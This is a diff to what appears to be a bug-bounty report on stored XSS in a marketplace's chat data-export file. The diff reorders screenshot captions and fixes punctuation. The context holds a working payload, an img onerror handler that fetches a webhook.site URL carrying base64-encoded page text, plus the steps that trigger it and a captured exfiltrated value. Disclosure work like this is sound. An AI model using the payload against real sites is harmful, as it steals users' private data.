@@ -43,13 +43,13 @@ This bypass confirms the filter is not a real XSS mitigation.
 ```html
 <img src=x onerror="fetch('https:'+'//webhook.site/<ID>/?d='+btoa(document.body.innerText.substring(0,500)))">
 ```
-![Base64 decoded PII data](/Screenshot 2026-10-01 194400.png)
+![Payload sent in chat](/Screenshot 2026-10-01 215433.png)
 
 **3.** The message is stored and rendered as plain text in the live chat UI, no execution occurs there.
 
 **4.** From the **victim account** (which never wrote anything malicious), go to:  
 *Settings → Privacy → Request data export* → confirm via email → download the ZIP.
-![Webhook receiving the exfiltrated request](/Screenshot 2026-10-01 215639.png)
+![Data export ZIP with messages folder](/Screenshot 2026-10-01 214958.png)
 
 **5.** Open the HTML file inside the archive:  
 `file:///.../messages/index.html`
@@ -62,13 +62,13 @@ This bypass confirms the filter is not a real XSS mitigation.
 ## Evidence
 
 **Payload received at webhook:**
-![Data export ZIP with messages folder](/Screenshot 2026-10-01 214958.png)
+![Webhook receiving the exfiltrated request](/Screenshot 2026-10-01 215639.png)
 
 d=TWVzc2FnZXMKTWVzc2FnZSB0aHJlYWRzIHlvdSd2ZS4uLg==
 
 **Decoded content (real victim account data):**
+![Base64 decoded PII data](/Screenshot 2026-10-01 194400.png)
 
-![Payload sent in chat](/Screenshot 2026-10-01 215433.png)
 
 Messages
 Message threads you've been part of
@@ -113,7 +113,7 @@ This should not be relied upon as a security control.
 ## Recommendation
 
 - Apply consistent **HTML output encoding** in the data-export generator for all user-controlled fields: chat messages, "About you", addresses, item titles/descriptions, reviews.
-- Audit whether the same HTML generator is reused in internal support/backoffice panels — the impact there could be significantly higher (authenticated context).
+- Audit whether the same HTML generator is reused in internal support/backoffice panels, the impact there could be significantly higher (authenticated context).
 - Do not treat the URL-detection filter as XSS mitigation.
 
 ---
